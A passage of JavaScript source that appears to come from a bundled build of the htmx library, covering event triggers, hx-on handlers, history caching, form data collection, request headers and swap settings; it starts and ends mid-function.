    function addEventListener(elt, handler4, nodeData, triggerSpec, explicitCancel) {
      const elementData = getInternalData(elt);
      let eltsToListenOn;
      if (triggerSpec.from) {
        eltsToListenOn = querySelectorAllExt(elt, triggerSpec.from);
      } else {
        eltsToListenOn = [elt];
      }
      if (triggerSpec.changed) {
        eltsToListenOn.forEach(function(eltToListenOn) {
          const eltToListenOnData = getInternalData(eltToListenOn);
          eltToListenOnData.lastValue = eltToListenOn.value;
        });
      }
      forEach(eltsToListenOn, function(eltToListenOn) {
        const eventListener = function(evt) {
          if (!bodyContains(elt)) {
            eltToListenOn.removeEventListener(triggerSpec.trigger, eventListener);
            return;
          }
          if (ignoreBoostedAnchorCtrlClick(elt, evt)) {
            return;
          }
          if (explicitCancel || shouldCancel(evt, elt)) {
            evt.preventDefault();
          }
          if (maybeFilterEvent(triggerSpec, elt, evt)) {
            return;
          }
          const eventData = getInternalData(evt);
          eventData.triggerSpec = triggerSpec;
          if (eventData.handledFor == null) {
            eventData.handledFor = [];
          }
          if (eventData.handledFor.indexOf(elt) < 0) {
            eventData.handledFor.push(elt);
            if (triggerSpec.consume) {
              evt.stopPropagation();
            }
            if (triggerSpec.target && evt.target) {
              if (!matches(asElement(evt.target), triggerSpec.target)) {
                return;
              }
            }
            if (triggerSpec.once) {
              if (elementData.triggeredOnce) {
                return;
              } else {
                elementData.triggeredOnce = true;
              }
            }
            if (triggerSpec.changed) {
              const eltToListenOnData = getInternalData(eltToListenOn);
              const value = eltToListenOn.value;
              if (eltToListenOnData.lastValue === value) {
                return;
              }
              eltToListenOnData.lastValue = value;
            }
            if (elementData.delayed) {
              clearTimeout(elementData.delayed);
            }
            if (elementData.throttle) {
              return;
            }
            if (triggerSpec.throttle > 0) {
              if (!elementData.throttle) {
                triggerEvent(elt, "htmx:trigger");
                handler4(elt, evt);
                elementData.throttle = getWindow().setTimeout(function() {
                  elementData.throttle = null;
                }, triggerSpec.throttle);
              }
            } else if (triggerSpec.delay > 0) {
              elementData.delayed = getWindow().setTimeout(function() {
                triggerEvent(elt, "htmx:trigger");
                handler4(elt, evt);
              }, triggerSpec.delay);
            } else {
              triggerEvent(elt, "htmx:trigger");
              handler4(elt, evt);
            }
          }
        };
        if (nodeData.listenerInfos == null) {
          nodeData.listenerInfos = [];
        }
        nodeData.listenerInfos.push({
          trigger: triggerSpec.trigger,
          listener: eventListener,
          on: eltToListenOn
        });
        eltToListenOn.addEventListener(triggerSpec.trigger, eventListener);
      });
    }
    let windowIsScrolling = false;
    let scrollHandler = null;
    function initScrollHandler() {
      if (!scrollHandler) {
        scrollHandler = function() {
          windowIsScrolling = true;
        };
        window.addEventListener("scroll", scrollHandler);
        setInterval(function() {
          if (windowIsScrolling) {
            windowIsScrolling = false;
            forEach(getDocument().querySelectorAll("[hx-trigger*='revealed'],[data-hx-trigger*='revealed']"), function(elt) {
              maybeReveal(elt);
            });
          }
        }, 200);
      }
    }
    function maybeReveal(elt) {
      if (!hasAttribute(elt, "data-hx-revealed") && isScrolledIntoView(elt)) {
        elt.setAttribute("data-hx-revealed", "true");
        const nodeData = getInternalData(elt);
        if (nodeData.initHash) {
          triggerEvent(elt, "revealed");
        } else {
          elt.addEventListener("htmx:afterProcessNode", function() {
            triggerEvent(elt, "revealed");
          }, { once: true });
        }
      }
    }
    function loadImmediately(elt, handler4, nodeData, delay) {
      const load = function() {
        if (!nodeData.loaded) {
          nodeData.loaded = true;
          handler4(elt);
        }
      };
      if (delay > 0) {
        getWindow().setTimeout(load, delay);
      } else {
        load();
      }
    }
    function processVerbs(elt, nodeData, triggerSpecs) {
      let explicitAction = false;
      forEach(VERBS, function(verb) {
        if (hasAttribute(elt, "hx-" + verb)) {
          const path = getAttributeValue(elt, "hx-" + verb);
          explicitAction = true;
          nodeData.path = path;
          nodeData.verb = verb;
          triggerSpecs.forEach(function(triggerSpec) {
            addTriggerHandler(elt, triggerSpec, nodeData, function(node, evt) {
              const elt2 = asElement(node);
              if (closest(elt2, htmx.config.disableSelector)) {
                cleanUpElement(elt2);
                return;
              }
              issueAjaxRequest(verb, path, elt2, evt);
            });
          });
        }
      });
      return explicitAction;
    }
    function addTriggerHandler(elt, triggerSpec, nodeData, handler4) {
      if (triggerSpec.trigger === "revealed") {
        initScrollHandler();
        addEventListener(elt, handler4, nodeData, triggerSpec);
        maybeReveal(asElement(elt));
      } else if (triggerSpec.trigger === "intersect") {
        const observerOptions = {};
        if (triggerSpec.root) {
          observerOptions.root = querySelectorExt(elt, triggerSpec.root);
        }
        if (triggerSpec.threshold) {
          observerOptions.threshold = parseFloat(triggerSpec.threshold);
        }
        const observer2 = new IntersectionObserver(function(entries) {
          for (let i = 0; i < entries.length; i++) {
            const entry = entries[i];
            if (entry.isIntersecting) {
              triggerEvent(elt, "intersect");
              break;
            }
          }
        }, observerOptions);
        observer2.observe(asElement(elt));
        addEventListener(asElement(elt), handler4, nodeData, triggerSpec);
      } else if (triggerSpec.trigger === "load") {
        if (!maybeFilterEvent(triggerSpec, elt, makeEvent("load", { elt }))) {
          loadImmediately(asElement(elt), handler4, nodeData, triggerSpec.delay);
        }
      } else if (triggerSpec.pollInterval > 0) {
        nodeData.polling = true;
        processPolling(asElement(elt), handler4, triggerSpec);
      } else {
        addEventListener(elt, handler4, nodeData, triggerSpec);
      }
    }
    function shouldProcessHxOn(node) {
      const elt = asElement(node);
      if (!elt) {
        return false;
      }
      const attributes = elt.attributes;
      for (let j = 0; j < attributes.length; j++) {
        const attrName = attributes[j].name;
        if (startsWith(attrName, "hx-on:") || startsWith(attrName, "data-hx-on:") || startsWith(attrName, "hx-on-") || startsWith(attrName, "data-hx-on-")) {
          return true;
        }
      }
      return false;
    }
    const HX_ON_QUERY = new XPathEvaluator().createExpression('.//*[@*[ starts-with(name(), "hx-on:") or starts-with(name(), "data-hx-on:") or starts-with(name(), "hx-on-") or starts-with(name(), "data-hx-on-") ]]');
    function processHXOnRoot(elt, elements) {
      if (shouldProcessHxOn(elt)) {
        elements.push(asElement(elt));
      }
      const iter = HX_ON_QUERY.evaluate(elt);
      let node = null;
      while (node = iter.iterateNext()) elements.push(asElement(node));
    }
    function findHxOnWildcardElements(elt) {
      const elements = [];
      if (elt instanceof DocumentFragment) {
        for (const child of elt.childNodes) {
          processHXOnRoot(child, elements);
        }
      } else {
        processHXOnRoot(elt, elements);
      }
      return elements;
    }
    function findElementsToProcess(elt) {
      if (elt.querySelectorAll) {
        const boostedSelector = ", [hx-boost] a, [data-hx-boost] a, a[hx-boost], a[data-hx-boost]";
        const extensionSelectors = [];
        for (const e in extensions) {
          const extension = extensions[e];
          if (extension.getSelectors) {
            var selectors = extension.getSelectors();
            if (selectors) {
              extensionSelectors.push(selectors);
            }
          }
        }
        const results = elt.querySelectorAll(VERB_SELECTOR + boostedSelector + ", form, [type='submit'], [hx-ext], [data-hx-ext], [hx-trigger], [data-hx-trigger]" + extensionSelectors.flat().map((s) => ", " + s).join(""));
        return results;
      } else {
        return [];
      }
    }
    function maybeSetLastButtonClicked(evt) {
      const elt = (
        /** @type {HTMLButtonElement|HTMLInputElement} */
        closest(asElement(evt.target), "button, input[type='submit']")
      );
      const internalData = getRelatedFormData(evt);
      if (internalData) {
        internalData.lastButtonClicked = elt;
      }
    }
    function maybeUnsetLastButtonClicked(evt) {
      const internalData = getRelatedFormData(evt);
      if (internalData) {
        internalData.lastButtonClicked = null;
      }
    }
    function getRelatedFormData(evt) {
      const elt = closest(asElement(evt.target), "button, input[type='submit']");
      if (!elt) {
        return;
      }
      const form = resolveTarget("#" + getRawAttribute(elt, "form"), elt.getRootNode()) || closest(elt, "form");
      if (!form) {
        return;
      }
      return getInternalData(form);
    }
    function initButtonTracking(elt) {
      elt.addEventListener("click", maybeSetLastButtonClicked);
      elt.addEventListener("focusin", maybeSetLastButtonClicked);
      elt.addEventListener("focusout", maybeUnsetLastButtonClicked);
    }
    function addHxOnEventHandler(elt, eventName, code) {
      const nodeData = getInternalData(elt);
      if (!Array.isArray(nodeData.onHandlers)) {
        nodeData.onHandlers = [];
      }
      let func;
      const listener2 = function(e) {
        maybeEval(elt, function() {
          if (eltIsDisabled(elt)) {
            return;
          }
          if (!func) {
            func = new Function("event", code);
          }
          func.call(elt, e);
        });
      };
      elt.addEventListener(eventName, listener2);
      nodeData.onHandlers.push({ event: eventName, listener: listener2 });
    }
    function processHxOnWildcard(elt) {
      deInitOnHandlers(elt);
      for (let i = 0; i < elt.attributes.length; i++) {
        const name = elt.attributes[i].name;
        const value = elt.attributes[i].value;
        if (startsWith(name, "hx-on") || startsWith(name, "data-hx-on")) {
          const afterOnPosition = name.indexOf("-on") + 3;
          const nextChar = name.slice(afterOnPosition, afterOnPosition + 1);
          if (nextChar === "-" || nextChar === ":") {
            let eventName = name.slice(afterOnPosition + 1);
            if (startsWith(eventName, ":")) {
              eventName = "htmx" + eventName;
            } else if (startsWith(eventName, "-")) {
              eventName = "htmx:" + eventName.slice(1);
            } else if (startsWith(eventName, "htmx-")) {
              eventName = "htmx:" + eventName.slice(5);
            }
            addHxOnEventHandler(elt, eventName, value);
          }
        }
      }
    }
    function initNode(elt) {
      if (closest(elt, htmx.config.disableSelector)) {
        cleanUpElement(elt);
        return;
      }
      const nodeData = getInternalData(elt);
      if (nodeData.initHash !== attributeHash(elt)) {
        deInitNode(elt);
        nodeData.initHash = attributeHash(elt);
        triggerEvent(elt, "htmx:beforeProcessNode");
        if (elt.value) {
          nodeData.lastValue = elt.value;
        }
        const triggerSpecs = getTriggerSpecs(elt);
        const hasExplicitHttpAction = processVerbs(elt, nodeData, triggerSpecs);
        if (!hasExplicitHttpAction) {
          if (getClosestAttributeValue(elt, "hx-boost") === "true") {
            boostElement(elt, nodeData, triggerSpecs);
          } else if (hasAttribute(elt, "hx-trigger")) {
            triggerSpecs.forEach(function(triggerSpec) {
              addTriggerHandler(elt, triggerSpec, nodeData, function() {
              });
            });
          }
        }
        if (elt.tagName === "FORM" || getRawAttribute(elt, "type") === "submit" && hasAttribute(elt, "form")) {
          initButtonTracking(elt);
        }
        triggerEvent(elt, "htmx:afterProcessNode");
      }
    }
    function processNode(elt) {
      elt = resolveTarget(elt);
      if (closest(elt, htmx.config.disableSelector)) {
        cleanUpElement(elt);
        return;
      }
      initNode(elt);
      forEach(findElementsToProcess(elt), function(child) {
        initNode(child);
      });
      forEach(findHxOnWildcardElements(elt), processHxOnWildcard);
    }
    function kebabEventName(str2) {
      return str2.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase();
    }
    function makeEvent(eventName, detail) {
      let evt;
      if (window.CustomEvent && typeof window.CustomEvent === "function") {
        evt = new CustomEvent(eventName, { bubbles: true, cancelable: true, composed: true, detail });
      } else {
        evt = getDocument().createEvent("CustomEvent");
        evt.initCustomEvent(eventName, true, true, detail);
      }
      return evt;
    }
    function triggerErrorEvent(elt, eventName, detail) {
      triggerEvent(elt, eventName, mergeObjects({ error: eventName }, detail));
    }
    function ignoreEventForLogging(eventName) {
      return eventName === "htmx:afterProcessNode";
    }
    function withExtensions(elt, toDo) {
      forEach(getExtensions(elt), function(extension) {
        try {
          toDo(extension);
        } catch (e) {
          logError(e);
        }
      });
    }
    function logError(msg) {
      if (console.error) {
        console.error(msg);
      } else if (console.log) {
        console.log("ERROR: ", msg);
      }
    }
    function triggerEvent(elt, eventName, detail) {
      elt = resolveTarget(elt);
      if (detail == null) {
        detail = {};
      }
      detail.elt = elt;
      const event = makeEvent(eventName, detail);
      if (htmx.logger && !ignoreEventForLogging(eventName)) {
        htmx.logger(elt, eventName, detail);
      }
      if (detail.error) {
        logError(detail.error);
        triggerEvent(elt, "htmx:error", { errorInfo: detail });
      }
      let eventResult = elt.dispatchEvent(event);
      const kebabName = kebabEventName(eventName);
      if (eventResult && kebabName !== eventName) {
        const kebabedEvent = makeEvent(kebabName, event.detail);
        eventResult = eventResult && elt.dispatchEvent(kebabedEvent);
      }
      withExtensions(asElement(elt), function(extension) {
        eventResult = eventResult && (extension.onEvent(eventName, event) !== false && !event.defaultPrevented);
      });
      return eventResult;
    }
    let currentPathForHistory = location.pathname + location.search;
    function getHistoryElement() {
      const historyElt = getDocument().querySelector("[hx-history-elt],[data-hx-history-elt]");
      return historyElt || getDocument().body;
    }
    function saveToHistoryCache(url, rootElt) {
      if (!canAccessLocalStorage()) {
        return;
      }
      const innerHTML = cleanInnerHtmlForHistory(rootElt);
      const title = getDocument().title;
      const scroll = window.scrollY;
      if (htmx.config.historyCacheSize <= 0) {
        localStorage.removeItem("htmx-history-cache");
        return;
      }
      url = normalizePath(url);
      const historyCache = parseJSON(localStorage.getItem("htmx-history-cache")) || [];
      for (let i = 0; i < historyCache.length; i++) {
        if (historyCache[i].url === url) {
          historyCache.splice(i, 1);
          break;
        }
      }
      const newHistoryItem = { url, content: innerHTML, title, scroll };
      triggerEvent(getDocument().body, "htmx:historyItemCreated", { item: newHistoryItem, cache: historyCache });
      historyCache.push(newHistoryItem);
      while (historyCache.length > htmx.config.historyCacheSize) {
        historyCache.shift();
      }
      while (historyCache.length > 0) {
        try {
          localStorage.setItem("htmx-history-cache", JSON.stringify(historyCache));
          break;
        } catch (e) {
          triggerErrorEvent(getDocument().body, "htmx:historyCacheError", { cause: e, cache: historyCache });
          historyCache.shift();
        }
      }
    }
    function getCachedHistory(url) {
      if (!canAccessLocalStorage()) {
        return null;
      }
      url = normalizePath(url);
      const historyCache = parseJSON(localStorage.getItem("htmx-history-cache")) || [];
      for (let i = 0; i < historyCache.length; i++) {
        if (historyCache[i].url === url) {
          return historyCache[i];
        }
      }
      return null;
    }
    function cleanInnerHtmlForHistory(elt) {
      const className = htmx.config.requestClass;
      const clone2 = (
        /** @type Element */
        elt.cloneNode(true)
      );
      forEach(findAll(clone2, "." + className), function(child) {
        removeClassFromElement(child, className);
      });
      forEach(findAll(clone2, "[data-disabled-by-htmx]"), function(child) {
        child.removeAttribute("disabled");
      });
      return clone2.innerHTML;
    }
    function saveCurrentPageToHistory() {
      const elt = getHistoryElement();
      const path = currentPathForHistory || location.pathname + location.search;
      let disableHistoryCache;
      try {
        disableHistoryCache = getDocument().querySelector('[hx-history="false" i],[data-hx-history="false" i]');
      } catch (e) {
        disableHistoryCache = getDocument().querySelector('[hx-history="false"],[data-hx-history="false"]');
      }
      if (!disableHistoryCache) {
        triggerEvent(getDocument().body, "htmx:beforeHistorySave", { path, historyElt: elt });
        saveToHistoryCache(path, elt);
      }
      if (htmx.config.historyEnabled) history.replaceState({ htmx: true }, getDocument().title, window.location.href);
    }
    function pushUrlIntoHistory(path) {
      if (htmx.config.getCacheBusterParam) {
        path = path.replace(/org\.htmx\.cache-buster=[^&]*&?/, "");
        if (endsWith(path, "&") || endsWith(path, "?")) {
          path = path.slice(0, -1);
        }
      }
      if (htmx.config.historyEnabled) {
        history.pushState({ htmx: true }, "", path);
      }
      currentPathForHistory = path;
    }
    function replaceUrlInHistory(path) {
      if (htmx.config.historyEnabled) history.replaceState({ htmx: true }, "", path);
      currentPathForHistory = path;
    }
    function settleImmediately(tasks) {
      forEach(tasks, function(task) {
        task.call(void 0);
      });
    }
    function loadHistoryFromServer(path) {
      const request = new XMLHttpRequest();
      const details = { path, xhr: request };
      triggerEvent(getDocument().body, "htmx:historyCacheMiss", details);
      request.open("GET", path, true);
      request.setRequestHeader("HX-Request", "true");
      request.setRequestHeader("HX-History-Restore-Request", "true");
      request.setRequestHeader("HX-Current-URL", getDocument().location.href);
      request.onload = function() {
        if (this.status >= 200 && this.status < 400) {
          triggerEvent(getDocument().body, "htmx:historyCacheMissLoad", details);
          const fragment = makeFragment(this.response);
          const content = fragment.querySelector("[hx-history-elt],[data-hx-history-elt]") || fragment;
          const historyElement = getHistoryElement();
          const settleInfo = makeSettleInfo(historyElement);
          handleTitle(fragment.title);
          swapInnerHTML(historyElement, content, settleInfo);
          settleImmediately(settleInfo.tasks);
          currentPathForHistory = path;
          triggerEvent(getDocument().body, "htmx:historyRestore", { path, cacheMiss: true, serverResponse: this.response });
        } else {
          triggerErrorEvent(getDocument().body, "htmx:historyCacheMissLoadError", details);
        }
      };
      request.send();
    }
    function restoreHistory(path) {
      saveCurrentPageToHistory();
      path = path || location.pathname + location.search;
      const cached = getCachedHistory(path);
      if (cached) {
        const fragment = makeFragment(cached.content);
        const historyElement = getHistoryElement();
        const settleInfo = makeSettleInfo(historyElement);
        handleTitle(fragment.title);
        swapInnerHTML(historyElement, fragment, settleInfo);
        settleImmediately(settleInfo.tasks);
        getWindow().setTimeout(function() {
          window.scrollTo(0, cached.scroll);
        }, 0);
        currentPathForHistory = path;
        triggerEvent(getDocument().body, "htmx:historyRestore", { path, item: cached });
      } else {
        if (htmx.config.refreshOnHistoryMiss) {
          window.location.reload(true);
        } else {
          loadHistoryFromServer(path);
        }
      }
    }
    function addRequestIndicatorClasses(elt) {
      let indicators = (
        /** @type Element[] */
        findAttributeTargets(elt, "hx-indicator")
      );
      if (indicators == null) {
        indicators = [elt];
      }
      forEach(indicators, function(ic) {
        const internalData = getInternalData(ic);
        internalData.requestCount = (internalData.requestCount || 0) + 1;
        ic.classList.add.call(ic.classList, htmx.config.requestClass);
      });
      return indicators;
    }
    function disableElements(elt) {
      let disabledElts = (
        /** @type Element[] */
        findAttributeTargets(elt, "hx-disabled-elt")
      );
      if (disabledElts == null) {
        disabledElts = [];
      }
      forEach(disabledElts, function(disabledElement) {
        const internalData = getInternalData(disabledElement);
        internalData.requestCount = (internalData.requestCount || 0) + 1;
        disabledElement.setAttribute("disabled", "");
        disabledElement.setAttribute("data-disabled-by-htmx", "");
      });
      return disabledElts;
    }
    function removeRequestIndicators(indicators, disabled2) {
      forEach(indicators, function(ic) {
        const internalData = getInternalData(ic);
        internalData.requestCount = (internalData.requestCount || 0) - 1;
        if (internalData.requestCount === 0) {
          ic.classList.remove.call(ic.classList, htmx.config.requestClass);
        }
      });
      forEach(disabled2, function(disabledElement) {
        const internalData = getInternalData(disabledElement);
        internalData.requestCount = (internalData.requestCount || 0) - 1;
        if (internalData.requestCount === 0) {
          disabledElement.removeAttribute("disabled");
          disabledElement.removeAttribute("data-disabled-by-htmx");
        }
      });
    }
    function haveSeenNode(processed, elt) {
      for (let i = 0; i < processed.length; i++) {
        const node = processed[i];
        if (node.isSameNode(elt)) {
          return true;
        }
      }
      return false;
    }
    function shouldInclude(element) {
      const elt = (
        /** @type {HTMLInputElement} */
        element
      );
      if (elt.name === "" || elt.name == null || elt.disabled || closest(elt, "fieldset[disabled]")) {
        return false;
      }
      if (elt.type === "button" || elt.type === "submit" || elt.tagName === "image" || elt.tagName === "reset" || elt.tagName === "file") {
        return false;
      }
      if (elt.type === "checkbox" || elt.type === "radio") {
        return elt.checked;
      }
      return true;
    }
    function addValueToFormData(name, value, formData) {
      if (name != null && value != null) {
        if (Array.isArray(value)) {
          value.forEach(function(v) {
            formData.append(name, v);
          });
        } else {
          formData.append(name, value);
        }
      }
    }
    function removeValueFromFormData(name, value, formData) {
      if (name != null && value != null) {
        let values = formData.getAll(name);
        if (Array.isArray(value)) {
          values = values.filter((v) => value.indexOf(v) < 0);
        } else {
          values = values.filter((v) => v !== value);
        }
        formData.delete(name);
        forEach(values, (v) => formData.append(name, v));
      }
    }
    function processInputValue(processed, formData, errors, elt, validate) {
      if (elt == null || haveSeenNode(processed, elt)) {
        return;
      } else {
        processed.push(elt);
      }
      if (shouldInclude(elt)) {
        const name = getRawAttribute(elt, "name");
        let value = elt.value;
        if (elt instanceof HTMLSelectElement && elt.multiple) {
          value = toArray(elt.querySelectorAll("option:checked")).map(function(e) {
            return (
              /** @type HTMLOptionElement */
              e.value
            );
          });
        }
        if (elt instanceof HTMLInputElement && elt.files) {
          value = toArray(elt.files);
        }
        addValueToFormData(name, value, formData);
        if (validate) {
          validateElement(elt, errors);
        }
      }
      if (elt instanceof HTMLFormElement) {
        forEach(elt.elements, function(input) {
          if (processed.indexOf(input) >= 0) {
            removeValueFromFormData(input.name, input.value, formData);
          } else {
            processed.push(input);
          }
          if (validate) {
            validateElement(input, errors);
          }
        });
        new FormData(elt).forEach(function(value, name) {
          if (value instanceof File && value.name === "") {
            return;
          }
          addValueToFormData(name, value, formData);
        });
      }
    }
    function validateElement(elt, errors) {
      const element = (
        /** @type {HTMLElement & ElementInternals} */
        elt
      );
      if (element.willValidate) {
        triggerEvent(element, "htmx:validation:validate");
        if (!element.checkValidity()) {
          errors.push({ elt: element, message: element.validationMessage, validity: element.validity });
          triggerEvent(element, "htmx:validation:failed", { message: element.validationMessage, validity: element.validity });
        }
      }
    }
    function overrideFormData(receiver, donor) {
      for (const key of donor.keys()) {
        receiver.delete(key);
      }
      donor.forEach(function(value, key) {
        receiver.append(key, value);
      });
      return receiver;
    }
    function getInputValues(elt, verb) {
      const processed = [];
      const formData = new FormData();
      const priorityFormData = new FormData();
      const errors = [];
      const internalData = getInternalData(elt);
      if (internalData.lastButtonClicked && !bodyContains(internalData.lastButtonClicked)) {
        internalData.lastButtonClicked = null;
      }
      let validate = elt instanceof HTMLFormElement && elt.noValidate !== true || getAttributeValue(elt, "hx-validate") === "true";
      if (internalData.lastButtonClicked) {
        validate = validate && internalData.lastButtonClicked.formNoValidate !== true;
      }
      if (verb !== "get") {
        processInputValue(processed, priorityFormData, errors, closest(elt, "form"), validate);
      }
      processInputValue(processed, formData, errors, elt, validate);
      if (internalData.lastButtonClicked || elt.tagName === "BUTTON" || elt.tagName === "INPUT" && getRawAttribute(elt, "type") === "submit") {
        const button = internalData.lastButtonClicked || /** @type HTMLInputElement|HTMLButtonElement */
        elt;
        const name = getRawAttribute(button, "name");
        addValueToFormData(name, button.value, priorityFormData);
      }
      const includes = findAttributeTargets(elt, "hx-include");
      forEach(includes, function(node) {
        processInputValue(processed, formData, errors, asElement(node), validate);
        if (!matches(node, "form")) {
          forEach(asParentNode(node).querySelectorAll(INPUT_SELECTOR), function(descendant) {
            processInputValue(processed, formData, errors, descendant, validate);
          });
        }
      });
      overrideFormData(formData, priorityFormData);
      return { errors, formData, values: formDataProxy(formData) };
    }
    function appendParam(returnStr, name, realValue) {
      if (returnStr !== "") {
        returnStr += "&";
      }
      if (String(realValue) === "[object Object]") {
        realValue = JSON.stringify(realValue);
      }
      const s = encodeURIComponent(realValue);
      returnStr += encodeURIComponent(name) + "=" + s;
      return returnStr;
    }
    function urlEncode(values) {
      values = formDataFromObject(values);
      let returnStr = "";
      values.forEach(function(value, key) {
        returnStr = appendParam(returnStr, key, value);
      });
      return returnStr;
    }
    function getHeaders(elt, target, prompt2) {
      const headers = {
        "HX-Request": "true",
        "HX-Trigger": getRawAttribute(elt, "id"),
        "HX-Trigger-Name": getRawAttribute(elt, "name"),
        "HX-Target": getAttributeValue(target, "id"),
        "HX-Current-URL": getDocument().location.href
      };
      getValuesForElement(elt, "hx-headers", false, headers);
      if (prompt2 !== void 0) {
        headers["HX-Prompt"] = prompt2;
      }
      if (getInternalData(elt).boosted) {
        headers["HX-Boosted"] = "true";
      }
      return headers;
    }
    function filterValues(inputValues, elt) {
      const paramsValue = getClosestAttributeValue(elt, "hx-params");
      if (paramsValue) {
        if (paramsValue === "none") {
          return new FormData();
        } else if (paramsValue === "*") {
          return inputValues;
        } else if (paramsValue.indexOf("not ") === 0) {
          forEach(paramsValue.substr(4).split(","), function(name) {
            name = name.trim();
            inputValues.delete(name);
          });
          return inputValues;
        } else {
          const newValues = new FormData();
          forEach(paramsValue.split(","), function(name) {
            name = name.trim();
            if (inputValues.has(name)) {
              inputValues.getAll(name).forEach(function(value) {
                newValues.append(name, value);
              });
            }
          });
          return newValues;
        }
      } else {
        return inputValues;
      }
    }
    function isAnchorLink(elt) {
      return !!getRawAttribute(elt, "href") && getRawAttribute(elt, "href").indexOf("#") >= 0;
    }
    function getSwapSpecification(elt, swapInfoOverride) {
      const swapInfo = swapInfoOverride || getClosestAttributeValue(elt, "hx-swap");
      const swapSpec = {
        swapStyle: getInternalData(elt).boosted ? "innerHTML" : htmx.config.defaultSwapStyle,
        swapDelay: htmx.config.defaultSwapDelay,
        settleDelay: htmx.config.defaultSettleDelay
      };
      if (htmx.config.scrollIntoViewOnBoost && getInternalData(elt).boosted && !isAnchorLink(elt)) {
        swapSpec.show = "top";
      }
      if (swapInfo) {
        const split = splitOnWhitespace(swapInfo);
        if (split.length > 0) {
          for (let i = 0; i < split.length; i++) {
            const value = split[i];
            if (value.indexOf("swap:") === 0) {
              swapSpec.swapDelay = parseInterval(value.substr(5));
            } else if (value.indexOf("settle:") === 0) {
              swapSpec.settleDelay = parseInterval(value.substr(7));
            } else if (value.indexOf("transition:") === 0) {
              swapSpec.transition = value.substr(11) === "true";
            } else if (value.indexOf("ignoreTitle:") === 0) {
              swapSpec.ignoreTitle = value.substr(12) === "true";
            } else if (value.indexOf("scroll:") === 0) {
              const scrollSpec = value.substr(7);
              var splitSpec = scrollSpec.split(":");
              const scrollVal = splitSpec.pop();
              var selectorVal = splitSpec.length > 0 ? splitSpec.join(":") : null;
              swapSpec.scroll = scrollVal;
              swapSpec.scrollTarget = selectorVal;
            } else if (value.indexOf("show:") === 0) {
              const showSpec = value.substr(5);
              var splitSpec = showSpec.split(":");
              const showVal = splitSpec.pop();
              var selectorVal = splitSpec.length > 0 ? splitSpec.join(":") : null;
              swapSpec.show = showVal;
              swapSpec.showTarget = selectorVal;
            } else if (value.indexOf("focus-scroll:") === 0) {
              const focusScrollVal = value.substr("focus-scroll:".length);
              swapSpec.focusScroll = focusScrollVal == "true";
            } else if (i == 0) {
              swapSpec.swapStyle = value;
            } else {
              logError("Unknown modifier in hx-swap: " + value);
            }
          }
        }
      }
      return swapSpec;
    }
    function usesFormData(elt) {
      return getClosestAttributeValue(elt, "hx-encoding") === "multipart/form-data" || matches(elt, "form") && getRawAttribute(elt, "enctype") === "multipart/form-data";
    }
    function encodeParamsForBody(xhr, elt, filteredParameters) {
      let encodedParameters = null;
      withExtensions(elt, function(extension) {
        if (encodedParameters == null) {
          encodedParameters = extension.encodeParameters(xhr, filteredParameters, elt);
        }
      });
      if (encodedParameters != null) {
        return encodedParameters;
      } else {
        if (usesFormData(elt)) {
          return overrideFormData(new FormData(), formDataFromObject(filteredParameters));
        } else {
          return urlEncode(filteredParameters);
        }
      }
    }
    function makeSettleInfo(target) {
      return { tasks: [], elts: [target] };
    }
    function updateScrollState(content, swapSpec) {
      const first = content[0];
      const last = content[content.length - 1];
      if (swapSpec.scroll) {
        var target = null;
        if (swapSpec.scrollTarget) {
          target = asElement(querySelectorExt(first, swapSpec.scrollTarget));
        }
        if (swapSpec.scroll === "top" && (first || target)) {
          target = target || first;
          target.scrollTop = 0;
        }
        if (swapSpec.scroll === "bottom" && (last || target)) {
          target = target || last;
          target.scrollTop = target.scrollHeight;
        }
      }
      if (swapSpec.show) {
        var target = null;
        if (swapSpec.showTarget) {
          let targetStr = swapSpec.showTarget;
          if (swapSpec.showTarget === "window") {
            targetStr = "body";
          }
          target = asElement(querySelectorExt(first, targetStr));
        }
        if (swapSpec.show === "top" && (first || target)) {
          target = target || first;
          target.scrollIntoView({ block: "start", behavior: htmx.config.scrollBehavior });
        }
        if (swapSpec.show === "bottom" && (last || target)) {
          target = target || last;
          target.scrollIntoView({ block: "end", behavior: htmx.config.scrollBehavior });
        }
      }
    }
    function getValuesForElement(elt, attr, evalAsDefault, values) {
      if (values == null) {
        values = {};
      }
      if (elt == null) {
        return values;
      }
      const attributeValue = getAttributeValue(elt, attr);
      if (attributeValue) {
        let str2 = attributeValue.trim();
        let evaluateValue = evalAsDefault;
        if (str2 === "unset") {
          return null;
        }
        if (str2.indexOf("javascript:") === 0) {
          str2 = str2.substr(11);
          evaluateValue = true;
        } else if (str2.indexOf("js:") === 0) {
          str2 = str2.substr(3);
          evaluateValue = true;
        }
        if (str2.indexOf("{") !== 0) {
          str2 = "{" + str2 + "}";
        }
        let varsValues;
        if (evaluateValue) {
          varsValues = maybeEval(elt, function() {
            return Function("return (" + str2 + ")")();
          }, {});
        } else {
          varsValues = parseJSON(str2);
        }
        for (const key in varsValues) {
          if (varsValues.hasOwnProperty(key)) {
            if (values[key] == null) {
              values[key] = varsValues[key];
            }
          }
        }
      }
      return getValuesForElement(asElement(parentElt(elt)), attr, evalAsDefault, values);
    }
    function maybeEval(elt, toEval, defaultVal) {
      if (htmx.config.allowEval) {
        return toEval();
      } else {
        triggerErrorEvent(elt, "htmx:evalDisallowedError");
        return defaultVal;
      }
    }
    function getHXVarsForElement(elt, expressionVars) {
      return getValuesForElement(elt, "hx-vars", true, expressionVars);
    }
    function getHXValsForElement(elt, expressionVars) {
      return getValuesForElement(elt, "hx-vals", false, expressionVars);
    }
    function getExpressionVars(elt) {
      return mergeObjects(getHXVarsForElement(elt), getHXValsForElement(elt));
    }
    function safelySetHeaderValue(xhr, header, headerValue) {
      if (headerValue !== null) {
        try {
          xhr.setRequestHeader(header, headerValue);
        } catch (e) {
          xhr.setRequestHeader(header, encodeURIComponent(headerValue));
          xhr.setRequestHeader(header + "-URI-AutoEncoded", "true");
        }
      }
    }
    function getPathFromResponse(xhr) {
      if (xhr.responseURL && typeof URL !== "undefined") {
        try {
          const url = new URL(xhr.responseURL);
          return url.pathname + url.search;
        } catch (e) {
          triggerErrorEvent(getDocument().body, "htmx:badResponseUrl", { url: xhr.responseURL });
        }
      }
    }
    function hasHeader(xhr, regexp) {
      return regexp.test(xhr.getAllResponseHeaders());
    }
    function ajaxHelper(verb, path, context) {
      verb = /** @type HttpVerb */
      verb.toLowerCase();
      if (context) {
        if (context instanceof Element || typeof context === "string") {
          return issueAjaxRequest(verb, path, null, null, {
            targetOverride: resolveTarget(context),
            returnPromise: true
          });
        } else {
          return issueAjaxRequest(
            verb,
            path,
